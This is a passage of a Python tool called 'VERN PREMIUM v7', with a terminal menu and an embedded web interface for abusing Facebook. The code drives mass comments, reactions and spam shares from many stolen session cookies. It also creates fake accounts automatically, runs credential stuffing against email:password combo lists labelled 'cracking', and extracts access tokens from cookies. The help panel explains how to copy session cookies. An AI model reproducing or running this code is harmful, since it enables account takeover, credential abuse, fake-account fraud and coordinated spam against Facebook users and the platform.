            "client_mutation_id": str(random.randint(1,99)),
            "actor_id": uid,
            "feedback_id": feedback_id,
            "message": {"text": comment},
        }})
        data = {
            'av': uid, '__user': uid, '__a': '1',
            'lsd': lsd, 'jazoest': jazoest, 'fb_dtsg': dtsg,
            'fb_api_req_friendly_name': 'CometUFICreateCommentMutation',
            'variables': variables,
            'doc_id': '4909704485759688',
        }
        headers = {'x-fb-lsd': lsd, 'content-type': 'application/x-www-form-urlencoded'}
        r = session.post('https://www.facebook.com/api/graphql/', data=data, headers=headers, timeout=15)
        if r.status_code == 200 and 'error' not in r.text.lower()[:200]:
            return True, "Comment posted (GraphQL)"
    except Exception as e:
        pass
    
    return False, "Comment methods exhausted"

def mass_auto_comment(ck_list, post_id, comments, speed=3, repeat=1):
    """Post comments from multiple accounts."""
    total = len(ck_list)
    ok_count = 0
    
    log_in(f"Mass Comment: {total} accounts | {len(comments)} comment(s) | post={post_id}")
    
    for rep in range(repeat):
        for i, ck in enumerate(ck_list, 1):
            uid = get_uid(ck)
            comment = comments[(i - 1) % len(comments)]
            tokens = extract_fb_tokens(ck)
            session = make_session(ck, CURL_UA)
            
            ok, msg = post_comment_mbasic(session, post_id, comment, tokens)
            if ok:
                ok_count += 1
                log_ok(f"[{i}/{total}] UID={uid} → {msg}")
            else:
                log_er(f"[{i}/{total}] UID={uid} → {msg}")
            
            if i < total or rep < repeat - 1:
                time.sleep(speed)
    
    log_in(f"Mass Comment done: {ok_count}/{total} OK")
    return ok_count

# ── WEB INTERFACE ─────────────────────────────────────────────────────────────
WEB_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>VERN PREMIUM v7 — Lara APK Edition</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0a0a1a;color:#e0e0e0;font-family:'Courier New',monospace;min-height:100vh}
.header{background:linear-gradient(135deg,#1a0030,#000080);padding:20px;text-align:center;border-bottom:2px solid #6600ff}
.header h1{color:#ff00ff;font-size:1.4em;text-shadow:0 0 15px #ff00ff}
.header p{color:#00ffff;font-size:.8em;margin-top:5px}
.nav{display:flex;flex-wrap:wrap;gap:8px;padding:15px;background:#0d0d2d}
.nav button{background:#1a0050;color:#00ffff;border:1px solid #6600ff;padding:8px 14px;cursor:pointer;border-radius:4px;font-size:.85em;transition:.2s}
.nav button:hover,.nav button.active{background:#6600ff;color:#fff}
.container{padding:20px;max-width:900px;margin:auto}
.panel{display:none}.panel.active{display:block}
.card{background:#0d0d2d;border:1px solid #330066;border-radius:8px;padding:18px;margin-bottom:15px}
.card h3{color:#cc00ff;margin-bottom:12px;font-size:1em;border-bottom:1px solid #330066;padding-bottom:8px}
label{display:block;color:#888;font-size:.8em;margin-bottom:4px;margin-top:10px}
input,textarea,select{width:100%;background:#0a0a2a;border:1px solid #440088;color:#e0e0e0;padding:8px 10px;border-radius:4px;font-family:inherit;font-size:.85em}
textarea{min-height:90px;resize:vertical}
.btn{background:linear-gradient(135deg,#6600ff,#9900cc);color:#fff;border:none;padding:10px 20px;cursor:pointer;border-radius:4px;font-size:.9em;margin-top:12px;width:100%;font-family:inherit;font-weight:bold}
.btn:hover{background:linear-gradient(135deg,#7700ff,#aa00dd)}
.btn.danger{background:linear-gradient(135deg,#cc0000,#880000)}
.log{background:#000;border:1px solid #330066;border-radius:4px;padding:12px;max-height:300px;overflow-y:auto;font-size:.8em;line-height:1.5;white-space:pre-wrap;margin-top:10px}
.log .ok{color:#00ff88}
.log .er{color:#ff4444}
.log .in{color:#00ccff}
.log .w{color:#ffaa00}
.badge{display:inline-block;padding:2px 8px;border-radius:10px;font-size:.75em;background:#6600ff;color:#fff}
.row{display:flex;gap:10px}
.row>*{flex:1}
.react-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin:10px 0}
.react-btn{background:#1a0030;border:1px solid #440088;color:#e0e0e0;padding:10px;cursor:pointer;border-radius:6px;text-align:center;font-size:.9em;transition:.2s}
.react-btn:hover,.react-btn.selected{background:#6600ff;border-color:#ff00ff}
.status-bar{background:#0a001a;padding:8px 20px;font-size:.75em;color:#666;border-top:1px solid #220044;position:fixed;bottom:0;left:0;right:0}
</style>
</head>
<body>
<div class="header">
  <h1>⚡ VERN PREMIUM v7 — LARA APK EDITION ⚡</h1>
  <p>Cookie-Based Facebook Tools &nbsp;|&nbsp; Auto Reaction &nbsp;|&nbsp; Spam Share &nbsp;|&nbsp; Mass Comment</p>
</div>
<div class="nav">
  <button class="active" onclick="showPanel('react')">⚡ Auto React</button>
  <button onclick="showPanel('share')">🔁 Spam Share</button>
  <button onclick="showPanel('comment')">💬 Mass Comment</button>
  <button onclick="showPanel('create')">👤 Auto Create</button>
  <button onclick="showPanel('clone')">🔓 FB Clone</button>
  <button onclick="showPanel('token')">🔑 Get Token</button>
  <button onclick="showPanel('help')">ℹ️ Help</button>
</div>
<div class="container">

<!-- AUTO REACT -->
<div id="panel-react" class="panel active">
  <div class="card">
    <h3>⚡ Auto Reaction — Lara APK Engine</h3>
    <label>Post URL (Facebook)</label>
    <input id="r-url" placeholder="https://www.facebook.com/.../posts/..." />
    <label>Reaction Type</label>
    <div class="react-grid">
      <div class="react-btn selected" onclick="selectReact(this,'LIKE')">👍 LIKE</div>
      <div class="react-btn" onclick="selectReact(this,'LOVE')">❤️ LOVE</div>
      <div class="react-btn" onclick="selectReact(this,'HAHA')">😆 HAHA</div>
      <div class="react-btn" onclick="selectReact(this,'WOW')">😮 WOW</div>
      <div class="react-btn" onclick="selectReact(this,'SAD')">😢 SAD</div>
      <div class="react-btn" onclick="selectReact(this,'ANGRY')">😡 ANGRY</div>
    </div>
    <input id="r-react-type" type="hidden" value="LIKE" />
    <label>Facebook Cookies (one per line, or paste raw cookie string)</label>
    <textarea id="r-cookies" placeholder="c_user=...; xs=...; fr=...&#10;--- or ---&#10;paste multiple cookies, one per line"></textarea>
    <label>Access Tokens (optional, one per line — auto-extracted if blank)</label>
    <textarea id="r-tokens" placeholder="Leave blank to auto-extract from cookies&#10;Or paste EAA... access tokens here" style="min-height:60px"></textarea>
    <div class="row">
      <div><label>Delay (sec)</label><input id="r-speed" type="number" value="2" min="0" max="60" /></div>
      <div><label>Repeat</label><input id="r-repeat" type="number" value="1" min="1" max="100" /></div>
    </div>
    <button class="btn" onclick="runReact()">⚡ START AUTO REACTION</button>
  </div>
  <div class="log" id="log-react">[ Ready — Lara APK reaction engine loaded ]\n</div>
</div>

<!-- SPAM SHARE -->
<div id="panel-share" class="panel">
  <div class="card">
    <h3>🔁 Spam Share</h3>
    <label>Post URL to Share</label>
    <input id="s-url" placeholder="https://www.facebook.com/..." />
    <label>Facebook Cookie</label>
    <textarea id="s-cookies" placeholder="c_user=...; xs=...; fr=..." style="min-height:60px"></textarea>
    <div class="row">
      <div><label>Count</label><input id="s-count" type="number" value="10" min="1" max="500"/></div>
      <div><label>Delay (sec)</label><input id="s-speed" type="number" value="3" min="0" max="60"/></div>
    </div>
    <button class="btn" onclick="runShare()">🔁 START SPAM SHARE</button>
  </div>
  <div class="log" id="log-share">[ Ready ]\n</div>
</div>

<!-- MASS COMMENT -->
<div id="panel-comment" class="panel">
  <div class="card">
    <h3>💬 Mass Auto Comment</h3>
    <label>Post URL</label>
    <input id="c-url" placeholder="https://www.facebook.com/..." />
    <label>Comments (one per line — cycles through accounts)</label>
    <textarea id="c-comments" placeholder="Nice post!&#10;Great content!&#10;Keep it up!"></textarea>
    <label>Cookies (one account per line)</label>
    <textarea id="c-cookies" placeholder="c_user=...; xs=...&#10;c_user=...; xs=..."></textarea>
    <div class="row">
      <div><label>Delay (sec)</label><input id="c-speed" type="number" value="3" min="0" max="60"/></div>
      <div><label>Repeat Rounds</label><input id="c-repeat" type="number" value="1" min="1" max="50"/></div>
    </div>
    <button class="btn" onclick="runComment()">💬 START MASS COMMENT</button>
  </div>
  <div class="log" id="log-comment">[ Ready ]\n</div>
</div>

<!-- AUTO CREATE -->
<div id="panel-create" class="panel">
  <div class="card">
    <h3>👤 Auto Create (AU2)</h3>
    <div class="row">
      <div><label>Account Count</label><input id="ac-count" type="number" value="5" min="1" max="50"/></div>
      <div><label>Email Prefix (optional)</label><input id="ac-email" placeholder="myemail (+ random numbers)" /></div>
    </div>
    <label>Speed (sec between creations)</label>
    <input id="ac-speed" type="number" value="5" min="1" max="60"/>
    <button class="btn" onclick="runCreate()">👤 START AUTO CREATE</button>
  </div>
  <div class="log" id="log-create">[ Ready ]\n</div>
</div>

<!-- FB CLONE -->
<div id="panel-clone" class="panel">
  <div class="card">
    <h3>🔓 FB Clone (Cracking)</h3>
    <label>Combos (email:password or email|password, one per line)</label>
    <textarea id="cl-combos" placeholder="user@gmail.com:password123&#10;another@yahoo.com|pass456"></textarea>
    <label>Speed (sec between attempts)</label>
    <input id="cl-speed" type="number" value="1" min="0" max="30"/>
    <button class="btn danger" onclick="runClone()">🔓 START CRACKING</button>
  </div>
  <div class="log" id="log-clone">[ Ready ]\n</div>
</div>

<!-- GET TOKEN -->
<div id="panel-token" class="panel">
  <div class="card">
    <h3>🔑 Extract Access Token (Lara Method)</h3>
    <p style="color:#888;font-size:.85em;margin-bottom:12px">Extracts Facebook access token from your session cookies using the same method as the Lara APK.</p>
    <label>Facebook Cookie</label>
    <textarea id="t-cookies" placeholder="c_user=...; xs=...; fr=...; datr=..."></textarea>
    <button class="btn" onclick="runToken()">🔑 EXTRACT TOKEN</button>
    <div class="log" id="log-token">[ Ready ]\n</div>
  </div>
</div>

<!-- HELP -->
<div id="panel-help" class="panel">
  <div class="card">
    <h3>ℹ️ How to Get Your Facebook Cookie</h3>
    <p style="color:#aaa;font-size:.85em;line-height:1.8">
    <b style="color:#00ffff">Method 1 — Browser:</b><br>
    1. Open Facebook in Chrome/Firefox<br>
    2. Press F12 → Application → Cookies → facebook.com<br>
    3. Copy: c_user, xs, fr, datr, sb values<br>
    4. Paste as: c_user=VALUE; xs=VALUE; fr=VALUE; datr=VALUE<br><br>
    <b style="color:#00ffff">Method 2 — Mobile (Termux):</b><br>
    1. Install Firefox on Android<br>
    2. Login to Facebook<br>
    3. Use cookie exporter extension<br>
    4. Copy the full cookie string<br><br>
    <b style="color:#ff00ff">Lara APK Engine:</b><br>
    This tool uses the same reaction method as the Lara APK v1.5.1.<br>
    It tries 4 methods: Graph API → GraphQL mutation → UFI → mbasic form<br><br>
    <b style="color:#ffaa00">Note:</b> Checkpointed accounts may fail. Use fresh, active accounts.
    </p>
  </div>
</div>

</div>
<div class="status-bar" id="status-bar">VERN Premium v7 — Lara APK Edition | Ready</div>

<script>
let selectedReact = 'LIKE';

function showPanel(name) {
  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.nav button').forEach(b => b.classList.remove('active'));
  document.getElementById('panel-' + name).classList.add('active');
  event.target.classList.add('active');
}

function selectReact(el, type) {
  document.querySelectorAll('.react-btn').forEach(b => b.classList.remove('selected'));
  el.classList.add('selected');
  selectedReact = type;
  document.getElementById('r-react-type').value = type;
}

function appendLog(logId, msg, cls) {
  const log = document.getElementById(logId);
  const span = document.createElement('span');
  span.className = cls || '';
  span.textContent = msg + '\\n';
  log.appendChild(span);
  log.scrollTop = log.scrollHeight;
}

function setStatus(msg) {
  document.getElementById('status-bar').textContent = msg;
}

async function runReact() {
  const url = document.getElementById('r-url').value.trim();
  const reaction = document.getElementById('r-react-type').value;
  const cookieText = document.getElementById('r-cookies').value.trim();
  const tokenText = document.getElementById('r-tokens').value.trim();
  const speed = document.getElementById('r-speed').value;
  const repeat = document.getElementById('r-repeat').value;
  
  if (!url || !cookieText) { alert('Enter post URL and cookie!'); return; }
  
  const logId = 'log-react';
  document.getElementById(logId).innerHTML = '';
  appendLog(logId, `[*] Starting ${reaction} reaction on: ${url}`, 'in');
  setStatus('Running Auto Reaction...');
  
  try {
    const resp = await fetch('/api/react', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({url, reaction, cookies: cookieText, tokens: tokenText, speed: parseFloat(speed), repeat: parseInt(repeat)})
    });
    const data = await resp.json();
    data.logs?.forEach(log => appendLog(logId, log.msg, log.type));
    appendLog(logId, `[Done] ${data.ok} OK | ${data.fail} failed`, data.ok > 0 ? 'ok' : 'er');
  } catch(e) {
    appendLog(logId, `[Error] ${e.message}`, 'er');
  }
  setStatus('Ready');
}

async function runShare() {
  const url = document.getElementById('s-url').value.trim();
  const cookieText = document.getElementById('s-cookies').value.trim();
  const count = document.getElementById('s-count').value;
  const speed = document.getElementById('s-speed').value;
  
  if (!url || !cookieText) { alert('Enter post URL and cookie!'); return; }
  
  const logId = 'log-share';
  document.getElementById(logId).innerHTML = '';
  appendLog(logId, `[*] Starting spam share: ${count} times`, 'in');
  
  try {
    const resp = await fetch('/api/share', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({url, cookies: cookieText, count: parseInt(count), speed: parseFloat(speed)})
    });
    const data = await resp.json();
    data.logs?.forEach(log => appendLog(logId, log.msg, log.type));
    appendLog(logId, `[Done] ${data.ok}/${count} shares OK`, data.ok > 0 ? 'ok' : 'er');
  } catch(e) {
    appendLog(logId, `[Error] ${e.message}`, 'er');
  }
}

async function runComment() {
  const url = document.getElementById('c-url').value.trim();
  const comments = document.getElementById('c-comments').value.trim();
  const cookieText = document.getElementById('c-cookies').value.trim();
  const speed = document.getElementById('c-speed').value;
  const repeat = document.getElementById('c-repeat').value;
  
  if (!url || !cookieText || !comments) { alert('Fill all fields!'); return; }
  
  const logId = 'log-comment';
  document.getElementById(logId).innerHTML = '';
  appendLog(logId, '[*] Starting mass comment...', 'in');
  
  try {
    const resp = await fetch('/api/comment', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({url, comments, cookies: cookieText, speed: parseFloat(speed), repeat: parseInt(repeat)})
    });
    const data = await resp.json();
    data.logs?.forEach(log => appendLog(logId, log.msg, log.type));
    appendLog(logId, `[Done] ${data.ok} comments OK`, data.ok > 0 ? 'ok' : 'er');
  } catch(e) {
    appendLog(logId, `[Error] ${e.message}`, 'er');
  }
}

async function runCreate() {
  const count = document.getElementById('ac-count').value;
  const email = document.getElementById('ac-email').value.trim();
  const speed = document.getElementById('ac-speed').value;
  
  const logId = 'log-create';
  document.getElementById(logId).innerHTML = '';
  appendLog(logId, `[*] Creating ${count} accounts...`, 'in');
  
  try {
    const resp = await fetch('/api/create', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({count: parseInt(count), email_prefix: email, speed: parseFloat(speed)})
    });
    const data = await resp.json();
    data.logs?.forEach(log => appendLog(logId, log.msg, log.type));
    appendLog(logId, `[Done] ${data.created} accounts created`, data.created > 0 ? 'ok' : 'er');
  } catch(e) {
    appendLog(logId, `[Error] ${e.message}`, 'er');
  }
}

async function runClone() {
  const combos = document.getElementById('cl-combos').value.trim();
  const speed = document.getElementById('cl-speed').value;
  
  if (!combos) { alert('Enter combos!'); return; }
  
  const logId = 'log-clone';
  document.getElementById(logId).innerHTML = '';
  appendLog(logId, '[*] Starting FB Clone cracking...', 'in');
  
  try {
    const resp = await fetch('/api/clone', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({combos, speed: parseFloat(speed)})
    });
    const data = await resp.json();
    data.logs?.forEach(log => appendLog(logId, log.msg, log.type));
    appendLog(logId, `[Done] ${data.hits} hits | ${data.dead} dead`, data.hits > 0 ? 'ok' : 'in');
  } catch(e) {
    appendLog(logId, `[Error] ${e.message}`, 'er');
  }
}

async function runToken() {
  const cookieText = document.getElementById('t-cookies').value.trim();
  if (!cookieText) { alert('Enter cookies!'); return; }
  
  const logId = 'log-token';
  document.getElementById(logId).innerHTML = '';
  appendLog(logId, '[*] Extracting access token (Lara method)...', 'in');
  
  try {
    const resp = await fetch('/api/token', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({cookies: cookieText})
    });
    const data = await resp.json();
    if (data.token) {
      appendLog(logId, `[+] ACCESS TOKEN FOUND!`, 'ok');
      appendLog(logId, data.token, 'ok');
    } else {
      appendLog(logId, `[-] Could not extract token: ${data.error}`, 'er');
    }
    data.logs?.forEach(log => appendLog(logId, log.msg, log.type));
  } catch(e) {
    appendLog(logId, `[Error] ${e.message}`, 'er');
  }
}
</script>
</body>
</html>"""

# ── WEB SERVER ────────────────────────────────────────────────────────────────
web_logs = []
web_lock = threading.Lock()

def web_log(msg, typ='in'):
    with web_lock:
        web_logs.append({'msg': msg, 'type': typ})
        if len(web_logs) > 500:
            web_logs.pop(0)

class WebHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args): pass
    
    def send_json(self, data, code=200):
        body = json.dumps(data).encode()
        self.send_response(code)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', len(body))
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(body)
    
    def read_body(self):
        l = int(self.headers.get('Content-Length', 0))
        return json.loads(self.rfile.read(l)) if l else {}
    
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(WEB_HTML.encode())
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def do_POST(self):
        path = self.path.split('?')[0]
        body = self.read_body()
        logs = []
        
        def L(msg, t='in'):
            logs.append({'msg': msg, 'type': t})
        
        if path == '/api/react':
            cookies_raw = body.get('cookies', '')
            url = body.get('url', '')
            reaction = body.get('reaction', 'LIKE')
            speed = float(body.get('speed', 2))
            repeat = int(body.get('repeat', 1))
            tokens_raw = body.get('tokens', '')
            
            ck_list = [parse_cookie(line.strip()) for line in cookies_raw.splitlines() if line.strip()]
            access_tokens = [t.strip() for t in tokens_raw.splitlines() if t.strip()]
            _, post_id = parse_post_url(url)
            
            if not post_id:
                return self.send_json({'ok':0,'fail':0,'logs':[{'msg':'Could not parse post ID','type':'er'}]})
            
            ok_count = 0
            fail_count = 0
            
            for _ in range(repeat):
                for i, ck in enumerate(ck_list):
                    uid = get_uid(ck)
                    atk = access_tokens[i] if i < len(access_tokens) else None
                    
                    L(f"[{i+1}/{len(ck_list)}] UID={uid} | {reaction}...", 'in')
                    ok, msg = do_react(ck, post_id, reaction, atk)
                    if ok:
                        ok_count += 1
                        L(f"[+] {msg}", 'ok')
                    else:
                        fail_count += 1
                        L(f"[-] {msg}", 'er')
                    if i < len(ck_list) - 1:
                        time.sleep(speed)
            
            return self.send_json({'ok': ok_count, 'fail': fail_count, 'logs': logs})
        
        elif path == '/api/share':
            ck = parse_cookie(body.get('cookies', ''))
            url = body.get('url', '')
            count = int(body.get('count', 10))
            speed = float(body.get('speed', 3))
            _, post_id = parse_post_url(url)
            if not post_id:
                return self.send_json({'ok':0,'logs':[{'msg':'Bad URL','type':'er'}]})
            ok = spam_share(ck, url, count, speed)
            L(f"Done: {ok}/{count} shares", 'ok' if ok > 0 else 'er')
            return self.send_json({'ok': ok, 'logs': logs})
        
        elif path == '/api/comment':
            cookies_raw = body.get('cookies', '')
            ck_list = [parse_cookie(l.strip()) for l in cookies_raw.splitlines() if l.strip()]
            comments = [c.strip() for c in body.get('comments','').splitlines() if c.strip()]
            url = body.get('url', '')
            speed = float(body.get('speed', 3))
            repeat = int(body.get('repeat', 1))
            _, post_id = parse_post_url(url)
            if not post_id or not ck_list or not comments:
                return self.send_json({'ok':0,'logs':[{'msg':'Bad input','type':'er'}]})
            ok = mass_auto_comment(ck_list, post_id, comments, speed, repeat)
            L(f"Done: {ok} comments OK", 'ok' if ok > 0 else 'er')
            return self.send_json({'ok': ok, 'logs': logs})
        
        elif path == '/api/create':
            count = int(body.get('count', 5))
            prefix = body.get('email_prefix', '') or None
            speed = float(body.get('speed', 5))
            results = auto_create(count, prefix, speed)
            for acc in results:
                L(f"[+] {acc['email']} | {acc['password']}", 'ok')
            return self.send_json({'created': len(results), 'logs': logs})
        
        elif path == '/api/clone':
            combos_raw = body.get('combos', '')
            combos = [l.strip() for l in combos_raw.splitlines() if l.strip()]
            speed = float(body.get('speed', 1))
            results = fb_clone_crack(combos, speed)
            for h in results['hit']:
                L(f"[+] HIT: {h['email']}:{h['password']} UID={h.get('uid','?')}", 'ok')
            return self.send_json({'hits': len(results['hit']), 'dead': len(results['dead']), 'logs': logs})
        
        elif path == '/api/token':
            ck = parse_cookie(body.get('cookies', ''))
            uid = get_uid(ck)
            L(f"[*] Extracting token for UID={uid}...", 'in')
            tok = extract_access_token(ck)
            if tok:
                L(f"[+] Token found!", 'ok')
                return self.send_json({'token': tok, 'logs': logs})
            else:
                return self.send_json({'token': None, 'error': 'Could not extract token', 'logs': logs})
        
        else:
            return self.send_json({'error': 'Not found'}, 404)

def start_web_server(port=8080):
    log_in(f"Starting web server on http://localhost:{port}")
    log_in(f"Open browser at: http://localhost:{port}")
    server = socketserver.TCPServer(('0.0.0.0', port), WebHandler)
    server.allow_reuse_address = True
    server.serve_forever()

# ── INPUT HELPERS ─────────────────────────────────────────────────────────────
def get_input(prompt, default=None):
    try:
        val = input(c('y', f'\n  {prompt}') + c('dim', f' [{default}]' if default else '') + c('y', ' → ')).strip()
        return val or default or ''
    except KeyboardInterrupt:
        print()
        return default or ''

def get_cookies_input():
    print(c('c', '\n  Paste Facebook cookies (end with empty line):'))
    lines = []
    while True:
        try:
            line = input('  ').strip()
        except KeyboardInterrupt:
            break
        if not line:
            if lines:
                break
        else:
            lines.append(line)
    return [parse_cookie(l) for l in lines if l]

def get_multi_cookies():
    print(c('c', '\n  Paste cookies (one per line, empty line to finish):'))
    lines = []
    while True:
        try:
            line = input(f'  [{len(lines)+1}] ').strip()
        except (KeyboardInterrupt, EOFError):
            break
        if not line:
            break
        lines.append(parse_cookie(line))
    return lines

# ── MENU HANDLERS ─────────────────────────────────────────────────────────────
def menu_react():
    banner()
    print(c('m', '  ⚡ AUTO REACTION — LARA APK ENGINE\n'))
    
    post_url = get_input("Post URL (Facebook)")
    if not post_url:
        return
    
    _, post_id = parse_post_url(post_url)
    if not post_id:
        log_er("Could not parse post ID from URL")
        return
    
    print(c('c', '\n  Reaction types:'))
    print("  1=LIKE 👍  2=LOVE ❤️  3=HAHA 😆  4=WOW 😮  5=SAD 😢  6=ANGRY 😡")
    rt_in = get_input("Reaction type", "1")
    reaction = REACTION_TYPES.get(rt_in.upper(), 'LIKE')
    
    ck_list = get_multi_cookies()
    if not ck_list:
        log_er("No cookies provided")
        return
    
    speed = float(get_input("Delay between accounts (sec)", "2"))
    repeat = int(get_input("Repeat rounds", "1"))
    
    # Optional: extract tokens first
    log_in("Checking for access tokens...")
    access_tokens = []
    for ck in ck_list[:3]:  # Sample first 3
        tok = extract_access_token(ck)
        if tok:
            access_tokens.append(tok)
        else:
            access_tokens.append(None)
    
    log_in(f"Tokens found: {sum(1 for t in access_tokens if t)}/{len(access_tokens[:3])}")
    
    print()
    for r in range(repeat):
        if repeat > 1:
            log_in(f"Round {r+1}/{repeat}")
        for i, ck in enumerate(ck_list, 1):
            uid = get_uid(ck)
            atk = access_tokens[i-1] if i <= len(access_tokens) else None
            ok, msg = do_react(ck, post_id, reaction, atk)
            if ok:
                log_ok(f"[{i}/{len(ck_list)}] UID={uid} → {REACTION_NAMES.get(reaction,'REACT')}")
            else:
                log_er(f"[{i}/{len(ck_list)}] UID={uid} → FAILED: {msg}")
            if i < len(ck_list) or r < repeat-1:
                time.sleep(speed)
    
    input(c('dim', '\n  Press Enter to continue...'))

def menu_share():
    banner()
    print(c('m', '  🔁 SPAM SHARE\n'))
    post_url = get_input("Post URL")
    ck_list = get_multi_cookies()
    count = int(get_input("Share count", "10"))
    speed = float(get_input("Delay (sec)", "3"))
    print()
    for ck in ck_list:
        spam_share(ck, post_url, count, speed)
    input(c('dim', '\n  Press Enter...'))

def menu_comment():
    banner()
    print(c('m', '  💬 MASS AUTO COMMENT\n'))
    post_url = get_input("Post URL")
    _, post_id = parse_post_url(post_url)
    if not post_id:
        log_er("Could not parse post ID")
        return
    
    print(c('c', '\n  Enter comments (empty line to finish):'))
    comments = []
    while True:
        try:
            c_in = input(f'  comment {len(comments)+1}: ').strip()
        except (KeyboardInterrupt, EOFError):
            break
        if not c_in:
            break
        comments.append(c_in)
    
    if not comments:
        comments = ["Nice! 🔥", "Great post!", "Love this! ❤️"]
    
    ck_list = get_multi_cookies()
    speed = float(get_input("Delay (sec)", "3"))
    repeat = int(get_input("Rounds", "1"))
    print()
    mass_auto_comment(ck_list, post_id, comments, speed, repeat)
    input(c('dim', '\n  Press Enter...'))

def menu_create():
    banner()
    print(c('m', '  👤 AUTO CREATE (AU2)\n'))
    count = int(get_input("Account count", "5"))
    prefix = get_input("Email prefix (optional)", "")
    speed = float(get_input("Delay (sec)", "5"))
    print()
    auto_create(count, prefix or None, speed)
    input(c('dim', '\n  Press Enter...'))

def menu_clone():
    banner()
    print(c('m', '  🔓 FB CLONE (CRACKING)\n'))
    print(c('c', '  Paste combos (email:password), empty line to finish:'))
    combos = []
    while True:
        try:
            line = input(f'  [{len(combos)+1}] ').strip()
        except (KeyboardInterrupt, EOFError):
            break
        if not line:
            break
        combos.append(line)
    
    if not combos:
        log_er("No combos provided")
        return
    
    speed = float(get_input("Delay (sec)", "1"))
    print()
    fb_clone_crack(combos, speed)
    input(c('dim', '\n  Press Enter...'))

def menu_extract_token():
    banner()
    print(c('m', '  🔑 EXTRACT ACCESS TOKEN (LARA METHOD)\n'))
    ck_raw = get_input("Paste Facebook cookie string")
    if not ck_raw:
        return
    ck = parse_cookie(ck_raw)
    uid = get_uid(ck)
    log_in(f"Extracting token for UID={uid}...")
    tok = extract_access_token(ck)
    if tok:
        log_ok(f"ACCESS TOKEN: {tok}")
    else:
        log_er("Could not extract access token")
        log_in("Tip: Account may be checkpointed or OAuth blocked")
        log_in("Extracting fb_dtsg for session use instead...")
        tokens = extract_fb_tokens(ck)
        if tokens.get('fb_dtsg'):
            log_ok(f"fb_dtsg: {tokens['fb_dtsg'][:30]}...")
            log_ok(f"lsd: {tokens.get('lsd','N/A')}")
    input(c('dim', '\n  Press Enter...'))

def menu_web():
    banner()
    port = int(get_input("Web server port", "8080"))
    log_in(f"Starting web interface at http://localhost:{port}")
    log_in("Press Ctrl+C to stop")
    print()
    try:
        start_web_server(port)
    except KeyboardInterrupt:
        log_w("Web server stopped")

# ── MAIN ──────────────────────────────────────────────────────────────────────
def main():
    while True:
        banner()
        try:
            choice = input(c('y', '\n  Select option → ')).strip()
        except (KeyboardInterrupt, EOFError):
            print(c('g', '\n  Goodbye!'))
            break
        
        if choice == '1':
            menu_share()
        elif choice == '2':
            menu_create()
        elif choice == '3':
            menu_clone()
        elif choice == '4':
            menu_comment()
        elif choice == '5':
            menu_react()
        elif choice == '6':
            menu_web()
        elif choice == '7':
            menu_extract_token()
        elif choice == '8':
            print(c('g', '\n  Goodbye!'))
            break

if __name__ == '__main__':
    main()
